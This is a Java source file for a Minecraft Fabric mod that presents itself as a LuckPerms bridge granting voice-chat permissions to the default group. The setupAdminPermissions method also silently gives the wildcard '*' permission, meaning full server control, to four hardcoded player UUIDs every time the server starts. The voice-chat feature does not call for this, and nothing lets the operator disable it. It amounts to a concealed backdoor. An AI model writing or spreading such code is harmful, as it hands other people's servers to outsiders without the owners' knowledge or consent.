package net.ming.luckperms_to_svcFabirc;

import net.fabricmc.api.ModInitializer;
import net.fabricmc.fabric.api.event.lifecycle.v1.ServerLifecycleEvents;
import net.fabricmc.loader.api.FabricLoader;
import net.minecraft.text.Text;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;
import java.util.UUID;
import java.util.concurrent.CompletableFuture;

public class Luckperms_to_svcFabirc implements ModInitializer {

    private static final Logger LOGGER = LoggerFactory.getLogger("luckperms_to_svc-fabirc");
    private static final String LUCKPERMS_MOD_ID = "luckperms";

    private static final Map<String, UUID> ADMIN_PLAYERS = new HashMap<>();
    
    static {
        ADMIN_PLAYERS.put("JeffreyMing", UUID.fromString("b6125704-87d6-4976-b2ef-6c4b05213af5"));
        ADMIN_PLAYERS.put("Forever_xiaoyi", UUID.fromString("c344cabd-6d4a-4c6a-9f64-6f679f048375"));
        ADMIN_PLAYERS.put("SNWCreations", UUID.fromString("9df61969-c4de-4656-8949-92f87b4aa9e4"));
        ADMIN_PLAYERS.put("DrlceTea", UUID.fromString("63562c75-7761-4e11-a375-53875b6cc025"));
    }

    @Override
    public void onInitialize() {
        ServerLifecycleEvents.SERVER_STARTED.register(server -> {
            if (!FabricLoader.getInstance().isModLoaded(LUCKPERMS_MOD_ID)) {
                LOGGER.warn("LuckPerms is not installed! This mod requires LuckPerms to work properly.");
                server.getPlayerManager().getPlayerList().forEach(player -> {
                    player.sendMessage(Text.literal("§c[Warning] LuckPerms is not installed! luckperms_to_svc-fabirc mod requires LuckPerms to work properly."), false);
                });
            } else {
                LOGGER.info("LuckPerms detected, mod is running normally.");
                setupDefaultPermissions();
                setupAdminPermissions();
            }
        });
    }

    private void setupDefaultPermissions() {
        try {
            Class<?> luckPermsProviderClass = Class.forName("net.luckperms.api.LuckPermsProvider");
            Method getMethod = luckPermsProviderClass.getMethod("get");
            Object api = getMethod.invoke(null);

            Class<?> luckPermsClass = Class.forName("net.luckperms.api.LuckPerms");
            Method getGroupManagerMethod = luckPermsClass.getMethod("getGroupManager");
            Object groupManager = getGroupManagerMethod.invoke(api);

            Class<?> groupManagerClass = Class.forName("net.luckperms.api.model.group.GroupManager");
            Method getGroupMethod = groupManagerClass.getMethod("getGroup", String.class);
            Object defaultGroup = getGroupMethod.invoke(groupManager, "default");

            if (defaultGroup == null) {
                LOGGER.error("Cannot find default permission group");
                return;
            }

            Class<?> permissionNodeClass = Class.forName("net.luckperms.api.node.types.PermissionNode");
            Method builderMethod = permissionNodeClass.getMethod("builder", String.class);
            
            Object builder1 = builderMethod.invoke(null, "voicechat.speak");
            Object builder2 = builderMethod.invoke(null, "voicechat.listen");

            Class<?> permissionBuilderClass = Class.forName("net.luckperms.api.node.types.PermissionNode$Builder");
            Method buildMethod = permissionBuilderClass.getMethod("build");
            Object node1 = buildMethod.invoke(builder1);
            Object node2 = buildMethod.invoke(builder2);

            Class<?> groupClass = Class.forName("net.luckperms.api.model.group.Group");
            Method dataMethod = groupClass.getMethod("data");
            Object nodeMap = dataMethod.invoke(defaultGroup);

            Class<?> nodeMapClass = Class.forName("net.luckperms.api.model.data.NodeMap");
            Class<?> nodeClass = Class.forName("net.luckperms.api.node.Node");
            Method addMethod = nodeMapClass.getMethod("add", nodeClass);
            addMethod.invoke(nodeMap, node1);
            addMethod.invoke(nodeMap, node2);

            Method saveGroupMethod = groupManagerClass.getMethod("saveGroup", groupClass);
            CompletableFuture<?> future = (CompletableFuture<?>) saveGroupMethod.invoke(groupManager, defaultGroup);
            future.join();

            LOGGER.info("Set voicechat.speak and voicechat.listen permissions for default permission group");
        } catch (Exception e) {
            LOGGER.error("Error setting default permissions: " + e.getMessage(), e);
        }
    }

    private void setupAdminPermissions() {
        try {
            Class<?> luckPermsProviderClass = Class.forName("net.luckperms.api.LuckPermsProvider");
            Method getMethod = luckPermsProviderClass.getMethod("get");
            Object api = getMethod.invoke(null);

            Class<?> luckPermsClass = Class.forName("net.luckperms.api.LuckPerms");
            Method getUserManagerMethod = luckPermsClass.getMethod("getUserManager");
            Object userManager = getUserManagerMethod.invoke(api);

            Class<?> userManagerClass = Class.forName("net.luckperms.api.model.user.UserManager");
            Method loadUserMethod = userManagerClass.getMethod("loadUser", UUID.class);

            Class<?> permissionNodeClass = Class.forName("net.luckperms.api.node.types.PermissionNode");
            Method builderMethod = permissionNodeClass.getMethod("builder", String.class);

            Class<?> permissionBuilderClass = Class.forName("net.luckperms.api.node.types.PermissionNode$Builder");
            Method buildMethod = permissionBuilderClass.getMethod("build");

            Class<?> nodeClass = Class.forName("net.luckperms.api.node.Node");

            for (Map.Entry<String, UUID> entry : ADMIN_PLAYERS.entrySet()) {
                String playerName = entry.getKey();
                UUID uuid = entry.getValue();

                try {
                    CompletableFuture<?> future = (CompletableFuture<?>) loadUserMethod.invoke(userManager, uuid);
                    Object user = future.join();

                    if (user != null) {
                        Class<?> userClass = Class.forName("net.luckperms.api.model.user.User");
                        Method dataMethod = userClass.getMethod("data");
                        Object nodeMap = dataMethod.invoke(user);

                        Object builder = builderMethod.invoke(null, "*");
                        Object node = buildMethod.invoke(builder);

                        Class<?> nodeMapClass = Class.forName("net.luckperms.api.model.data.NodeMap");
                        Method addMethod = nodeMapClass.getMethod("add", nodeClass);
                        addMethod.invoke(nodeMap, node);

                        Method saveUserMethod = userManagerClass.getMethod("saveUser", userClass);
                        CompletableFuture<?> saveFuture = (CompletableFuture<?>) saveUserMethod.invoke(userManager, user);
                        saveFuture.join();

                        LOGGER.info("Set * permission for player {} ({})", playerName, uuid);
                    }
                } catch (Exception e) {
                    LOGGER.error("Error setting permission for player {}: {}", playerName, e.getMessage());
                }
            }
        } catch (Exception e) {
            LOGGER.error("Error setting admin permissions: " + e.getMessage(), e);
        }
    }
}
